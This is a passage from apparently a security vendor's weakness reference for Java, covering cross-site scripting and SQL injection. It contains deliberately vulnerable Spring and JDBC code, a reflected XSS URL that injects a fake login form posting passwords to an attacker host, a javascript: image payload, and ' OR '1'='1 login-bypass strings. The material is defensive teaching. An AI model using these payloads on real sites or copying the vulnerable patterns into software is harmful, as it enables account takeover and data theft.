<p>The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.</p>
<h3 id="dom-based">DOM-based</h3>
<p>In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.</p>
<h1 id="vulnerability-and-risk1">Vulnerability and risk<sup id="fnref-cwe"><a class="footnote-ref" href="#fn-cwe">1</a></sup></h1>
<p>The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact.</p>
<table>
<thead>
<tr>
<th>Scope</th>
<th>Impact</th>
<th>Likelihood</th>
</tr>
</thead>
<tbody>
<tr>
<td>Access Control Confidentiality</td>
<td>The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also.</td>
<td></td>
</tr>
<tr>
<td>Integrity Confidentiality Availability</td>
<td>In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws.</td>
<td></td>
</tr>
<tr>
<td>Confidentiality Integrity Availability Access Control</td>
<td>The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running "Active X" controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content.</td>
<td></td>
</tr>
</tbody>
</table>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="example-1">Example 1</h3>
<p>This code displays a welcome message on a web page based on the HTTP GET <code>msg</code> parameter. This example covers a Reflected XSS scenario.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// Copyright (C), 2016-2018, Sourcebrella, Inc Ltd - All rights reserved.</span>
<span class="c1">// Unauthorized copying, using, modifying of this file, via any medium is</span>
<span class="c1">// strictly prohibited.</span>
<span class="c1">// Proprietary and confidential.</span>

<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestParam</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="o">;</span>

<span class="nd">@RestController</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">VunerableController</span> <span class="o">{</span>
  <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/echo"</span><span class="o">)</span>
  <span class="kd">public</span> <span class="n">String</span> <span class="nf">echo</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"msg"</span><span class="o">)</span> <span class="n">String</span> <span class="n">msg</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">return</span> <span class="n">msg</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>Because the parameter can be arbitrary, the url of the page could be modified so <code>msg</code> contains scripting syntax, such as</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>http://trusted.sbrella.in/echo?msg=<span class="nt">&lt;script</span> <span class="na">language=</span><span class="s">"javascript"</span><span class="nt">&gt;</span>alert("You've been attacked!");<span class="nt">&lt;/script&gt;</span>
</pre></div>
</td></tr></table>
<p>This results in a harmless alert dialogue popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers.
More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>http://trusted.sbrella.in/echo?msg=<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"stealpassword"</span><span class="nt">&gt;</span>Please Login:<span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">"input"</span> <span class="na">action=</span><span class="s">"http://attack.sbrella.in/stealpassword"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="nt">/&gt;&lt;br/&gt;</span>Password: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"password"</span> <span class="nt">/&gt;&lt;br/&gt;&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Login"</span> <span class="nt">/&gt;&lt;/form&gt;&lt;/div&gt;</span>
</pre></div>
</td></tr></table>
<p>If a user clicks on this link then <code>echo</code> handler will generate the following HTML and send it to user's browser</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"stealpassword"</span><span class="p">&gt;</span>
  Please Login:
  <span class="p">&lt;</span><span class="nt">form</span> <span class="na">name</span><span class="o">=</span><span class="s">"input"</span> <span class="na">action</span><span class="o">=</span><span class="s">"http://attack.sbrella.in/stealpassword"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span><span class="p">&gt;</span>
    Username:
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"username"</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>Password: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"password"</span> <span class="na">name</span><span class="o">=</span><span class="s">"password"</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"Login"</span> <span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div>
</td></tr></table>
<p>If a user submits this form, attackers can easily get user's password.</p>
<h3 id="example-2">Example 2</h3>
<p>The following example consists of two separate pages in a web application, one devoted to creating user accounts and another devoted to listing users. It displays a Persistent XSS scenario.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// Copyright (C), 2016-2018, Sourcebrella, Inc Ltd - All rights reserved.</span>
<span class="c1">// Unauthorized copying, using, modifying of this file, via any medium is</span>
<span class="c1">// strictly prohibited.</span>
<span class="c1">// Proprietary and confidential.</span>

<span class="kn">import</span> <span class="nn">java.util.Collection</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Optional</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.logging.Level</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.logging.Logger</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestParam</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="o">;</span>

<span class="kd">interface</span> <span class="nc">Row</span> <span class="o">{</span>
  <span class="n">Object</span> <span class="nf">getColumnByName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">);</span>
<span class="o">}</span>

<span class="kd">interface</span> <span class="nc">QueryResult</span> <span class="o">{</span>
  <span class="n">Row</span> <span class="nf">fetchOne</span><span class="o">();</span>

  <span class="n">Collection</span><span class="o">&lt;</span><span class="n">Row</span><span class="o">&gt;</span> <span class="nf">fetchAll</span><span class="o">();</span>
<span class="o">}</span>

<span class="kd">interface</span> <span class="nc">SQLConnection</span> <span class="o">{</span>
  <span class="n">QueryResult</span> <span class="nf">execute</span><span class="o">(</span><span class="n">String</span> <span class="n">query</span><span class="o">);</span>
  <span class="n">Optional</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="nf">sanitize</span><span class="o">(</span><span class="n">String</span> <span class="n">query</span><span class="o">);</span>
<span class="o">}</span>

<span class="nd">@RestController</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DemoController</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> 
                       <span class="n">Logger</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">DemoController</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
  <span class="kd">private</span> <span class="kd">final</span> <span class="n">SQLConnection</span> <span class="n">connection</span><span class="o">;</span>

  <span class="kd">public</span> <span class="nf">DemoController</span><span class="o">(</span><span class="n">SQLConnection</span> <span class="n">connection</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">connection</span> <span class="o">=</span> <span class="n">connection</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/createuser"</span><span class="o">)</span>
  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">createUser</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"username"</span><span class="o">)</span> <span class="n">String</span> <span class="n">username</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">Optional</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">s</span> <span class="o">=</span>
        <span class="n">connection</span><span class="o">.</span><span class="na">sanitize</span><span class="o">(</span>
            <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"insert into users (username) values (\"%s\")"</span><span class="o">,</span> <span class="n">username</span><span class="o">));</span>
    <span class="k">if</span> <span class="o">(!</span><span class="n">s</span><span class="o">.</span><span class="na">isPresent</span><span class="o">())</span> <span class="o">{</span>
      <span class="k">return</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="n">connection</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">get</span><span class="o">());</span>
    <span class="k">return</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/listusers"</span><span class="o">)</span>
  <span class="kd">public</span> <span class="n">String</span> <span class="nf">listUsers</span><span class="o">()</span> <span class="o">{</span>
    <span class="n">QueryResult</span> <span class="n">result</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="s">"select * from users"</span><span class="o">);</span>
    <span class="n">String</span> <span class="n">content</span> <span class="o">=</span> <span class="s">"&lt;div id=userlist&gt;Users:"</span><span class="o">;</span>
    <span class="k">for</span> <span class="o">(</span><span class="n">Row</span> <span class="n">row</span> <span class="o">:</span> <span class="n">result</span><span class="o">.</span><span class="na">fetchAll</span><span class="o">())</span> <span class="o">{</span>
      <span class="n">String</span> <span class="n">username</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">row</span><span class="o">.</span><span class="na">getColumnByName</span><span class="o">(</span><span class="s">"username"</span><span class="o">);</span>
      <span class="n">content</span> <span class="o">+=</span> <span class="s">"&lt;div class=\"username\"&gt;"</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">"&lt;/div&gt;"</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="n">content</span> <span class="o">+=</span> <span class="s">"&lt;/div&gt;"</span><span class="o">;</span>
    <span class="k">return</span> <span class="n">content</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Users page. This HTML can, for example, be a password stealing Login message.</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<h3 id="vetted-library-or-framework1">Vetted library or framework<sup id="fnref2-cwe"><a class="footnote-ref" href="#fn-cwe">1</a></sup></h3>
<p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
Examples of libraries and frameworks that make it easier to generate properly encoded output include <a href="https://www.microsoft.com/en-us/download/details.aspx?id=43126">Microsoft's Anti-XSS library</a>, the <a href="https://www.javadoc.io/doc/org.owasp.esapi/esapi/2.1.0.1">OWASP ESAPI</a>, and <a href="https://wicket.apache.org/">Apache Wicket</a>.</p>
<h3 id="contextual-output-encodingescaping-of-string-input2">Contextual output encoding/escaping of string input<sup id="fnref-wikipedia"><a class="footnote-ref" href="#fn-wikipedia">2</a></sup></h3>
<p>Contextual output encoding/escaping could be used as the primary defense mechanism to stop XSS attacks. There are several escaping schemes that can be used depending on where the untrusted string needs to be placed within an HTML document including HTML entity encoding, JavaScript escaping, CSS escaping, and URL (or percent) encoding. Most web applications that do not need to accept rich data can use escaping to largely eliminate the risk of XSS attacks in a fairly straightforward manner.
Although widely recommended, performing HTML entity encoding only on the five XML significant characters is not always sufficient to prevent many forms of XSS attacks. As encoding is often difficult, security encoding libraries are usually easier to use.</p>
<h3 id="safely-validating-untrusted-html-input2">Safely validating untrusted HTML input<sup id="fnref2-wikipedia"><a class="footnote-ref" href="#fn-wikipedia">2</a></sup></h3>
<p>Many operators of particular web applications (e.g. forums and webmail) allow users to utilize a limited subset of HTML markup. When accepting HTML input from users (say, <code>&lt;b&gt;very&lt;/b&gt; large</code>), output encoding (such as <code>&amp;lt;b&amp;gt;very&amp;lt;/b&amp;gt; large</code>) will not suffice since the user input needs to be rendered as HTML by the browser (so it shows as <code>very large</code>, instead of <code>&lt;b&gt;very&lt;/b&gt; large</code>). Stopping an XSS attack when accepting HTML input from users is much more complex in this situation. Untrusted HTML input must be run through an HTML sanitization engine to ensure that it does not contain XSS code.
It should also be noted that many validations rely on parsing out (blacklisting) specific "at risk" html tags such as the following</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="err"> &lt;link&gt; &lt;iframe&gt;</span>
</pre></div>
</td></tr></table>
<p>There are several issues with this approach, for example sometimes seemingly harmless tags can be left out which when utilized correctly can still result in an XSS. See below</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">"javascript:alert(1)"</span><span class="p">&gt;</span>
</pre></div>
</td></tr></table>
<p>Another popular method is to strip user input of " and ' however this can also be bypassed as the payload can be concealed with Obfuscation.</p>
<h3 id="separate-data-and-code1">Separate data and code<sup id="fnref3-cwe"><a class="footnote-ref" href="#fn-cwe">1</a></sup></h3>
<p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</p>
<h3 id="set-the-session-cookie-to-be-httponly16">Set the session cookie to be HttpOnly<sup id="fnref4-cwe"><a class="footnote-ref" href="#fn-cwe">1</a></sup><sup id="fnref-http-only"><a class="footnote-ref" href="#fn-http-only">6</a></sup></h3>
<p>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use <code>document.cookie</code>. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, <code>XMLHTTPRequest</code> and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</p>
<h3 id="disable-scripts2">Disable scripts<sup id="fnref3-wikipedia"><a class="footnote-ref" href="#fn-wikipedia">2</a></sup></h3>
<p>While Web 2.0 and Ajax developers require the use of JavaScript, some web applications are written to allow operation without the need for any client-side scripts. This allows users, if they choose, to disable scripting in their browsers before using the application. In this way, even potentially malicious client-side scripts could be inserted unescaped on a page, and users would not be susceptible to XSS attacks.</p>
<h3 id="cookie-protection2">Cookie protection<sup id="fnref4-wikipedia"><a class="footnote-ref" href="#fn-wikipedia">2</a></sup></h3>
<p>Besides content filtering, other imperfect methods for cross-site scripting mitigation are also commonly used. One example is the use of additional security controls when handling cookie-based user authentication. Many web applications rely on session cookies for authentication between individual HTTP requests, and because client-side scripts generally have access to these cookies, simple XSS exploits can steal these cookies. To mitigate this particular threat (though not the XSS problem in general), many web applications tie session cookies to the IP address of the user who originally logged in, then only permit that IP to use that cookie. This is effective in most situations (if an attacker is only after the cookie), but obviously breaks down in situations where an attacker is behind the same NATed IP address or web proxy as the victim, or the victim is changing his or her mobile IP.</p>
<h3 id="use-static-code-analyzer">Use static code analyzer</h3>
<p>Such as Pinpoint from <a href="https://www.sourcebrella.com/">Sourcebrella Inc</a></p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/79.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a><a class="footnote-backref" href="#fnref2-cwe" title="Jump back to footnote 1 in the text">↩</a><a class="footnote-backref" href="#fnref3-cwe" title="Jump back to footnote 1 in the text">↩</a><a class="footnote-backref" href="#fnref4-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-wikipedia">
<p>https://en.wikipedia.org/wiki/Cross-site_scripting <a class="footnote-backref" href="#fnref-wikipedia" title="Jump back to footnote 2 in the text">↩</a><a class="footnote-backref" href="#fnref2-wikipedia" title="Jump back to footnote 2 in the text">↩</a><a class="footnote-backref" href="#fnref3-wikipedia" title="Jump back to footnote 2 in the text">↩</a><a class="footnote-backref" href="#fnref4-wikipedia" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
<li id="fn-htbridge">
<p>https://www.htbridge.com/vulnerability/cross-site-scripting.html <a class="footnote-backref" href="#fnref-htbridge" title="Jump back to footnote 3 in the text">↩</a></p>
</li>
<li id="fn-white-hat-web">
<p>https://www.amazon.cn/dp/B00LADBDG6/ref=sr_1_1?ie=UTF8&amp;qid=1525694060&amp;sr=8-1&amp;keywords=%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8 <a class="footnote-backref" href="#fnref-white-hat-web" title="Jump back to footnote 4 in the text">↩</a></p>
</li>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 5 in the text">↩</a></p>
</li>
<li id="fn-http-only">
<p>https://www.owasp.org/index.php/HttpOnly#What_is_HttpOnly.3F <a class="footnote-backref" href="#fnref-http-only" title="Jump back to footnote 6 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/web.html">Web</a>
                <a href="../../tag/java.html">Java</a>
                <a href="../../tag/injection.html">Injection</a>
                <a href="../../tag/cwe-79.html">CWE-79</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0081">SQL Injection Vulnerability</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 4 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>SQL injection vulnerabilities arise in applications where elements of a SQL query originate from an untrusted source. Without precautions, the untrusted data may maliciously alter the query, resulting in information leaks or data modification. </p>
<p>Suppose a system authenticates users by issuing the following query to a SQL database. If the query returns any results, authentication succeeds; otherwise, authentication fails.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">db_user</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'&lt;USERNAME&gt;'</span> <span class="k">AND</span>  <span class="n">password</span><span class="o">=</span><span class="s1">'&lt;PASSWORD&gt;'</span>
</pre></div>
</td></tr></table>
<p>Suppose an attacker can substitute arbitrary strings for <username> and <password>. In that case, the authentication mechanism can be bypassed by supplying the following <username> with an arbitrary password:</username></password></username></p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">validuser</span><span class="s1">' OR '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
</pre></div>
</td></tr></table>
<p>The authentication routine dynamically constructs the following query:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">db_user</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'validuser'</span> <span class="k">OR</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">AND</span> <span class="n">password</span><span class="o">=</span><span class="s1">'&lt;PASSWORD&gt;'</span>
</pre></div>
</td></tr></table>
<p>If validuser is a valid user name, this SELECT statement yields the validuser record in the table. The password is never checked because <code>username='validuser'</code> is true; consequently, the items after the OR are not tested. As long as the components after the OR generate a syntactically correct SQL expression, the attacker is granted the access of validuser.</p>
<p>Similarly, an attacker could supply the following string for <password> with an arbitrary username:</password></p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="s1">' OR '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
</pre></div>
</td></tr></table>
<p>producing the following query:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">db_user</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'&lt;USERNAME&gt;'</span> <span class="k">AND</span> <span class="n">password</span><span class="o">=</span><span class="s1">''</span> <span class="k">OR</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1'</span>
</pre></div>
</td></tr></table>
<p><code>'1'='1'</code> always evaluates to true, causing the query to yield every row in the database. In this scenario, the attacker would be authenticated without needing a valid username or password.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>SQL injection is a code injection technique, used to attack data-driven applications, in which nefarious SQL statements are inserted into an entry field for execution (e.g. to dump the database contents to the attacker). SQL injection must exploit a security vulnerability in an application's software, for example, when user input is either incorrectly filtered for string literal escape characters embedded in SQL statements or user input is not strongly typed and unexpectedly executed. SQL injection is mostly known as an attack vector for websites but can be used to attack any type of SQL database.</p>
<p>SQL injection attacks allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server.</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>The primary means of preventing SQL injection are sanitization and validation, which are typically implemented as parameterized queries and stored procedures.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<p>The JDBC library provides an API for building SQL commands that sanitize untrusted data. The java.sql.PreparedStatement class properly escapes input strings, preventing SQL injection when used correctly. This code example modifies the doPrivilegedAction() method to use a PreparedStatement instead of java.sql.Statement. However, the prepared statement still permits a SQL injection attack by incorporating the unsanitized input argument username into the prepared statement.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.sql.Connection</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.DriverManager</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.ResultSet</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.SQLException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.Statement</span><span class="o">;</span>

<span class="kd">class</span> <span class="nc">Login</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="n">Connection</span> <span class="nf">getConnection</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
    <span class="n">DriverManager</span><span class="o">.</span><span class="na">registerDriver</span><span class="o">(</span><span class="k">new</span>
            <span class="n">com</span><span class="o">.</span><span class="na">microsoft</span><span class="o">.</span><span class="na">sqlserver</span><span class="o">.</span><span class="na">jdbc</span><span class="o">.</span><span class="na">SQLServerDriver</span><span class="o">());</span>
    <span class="n">String</span> <span class="n">dbConnection</span> <span class="o">=</span>
      <span class="n">PropertyManager</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"db.connection"</span><span class="o">);</span>
    <span class="c1">// Can hold some value like</span>
    <span class="c1">// "jdbc:microsoft:sqlserver://&lt;HOST&gt;:1433,&lt;UID&gt;,&lt;PWD&gt;"</span>
    <span class="k">return</span> <span class="n">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="n">dbConnection</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="n">String</span> <span class="nf">hashPassword</span><span class="o">(</span><span class="kt">char</span><span class="o">[]</span> <span class="n">password</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// Create hash of password</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doPrivilegedAction</span><span class="o">(</span>
    <span class="n">String</span> <span class="n">username</span><span class="o">,</span> <span class="kt">char</span><span class="o">[]</span> <span class="n">password</span>
  <span class="o">)</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
    <span class="n">Connection</span> <span class="n">connection</span> <span class="o">=</span> <span class="n">getConnection</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">connection</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Handle error</span>
    <span class="o">}</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">String</span> <span class="n">pwd</span> <span class="o">=</span> <span class="n">hashPassword</span><span class="o">(</span><span class="n">password</span><span class="o">);</span>
      <span class="n">String</span> <span class="n">sqlString</span> <span class="o">=</span> <span class="s">"select * from db_user where username="</span> <span class="o">+</span>
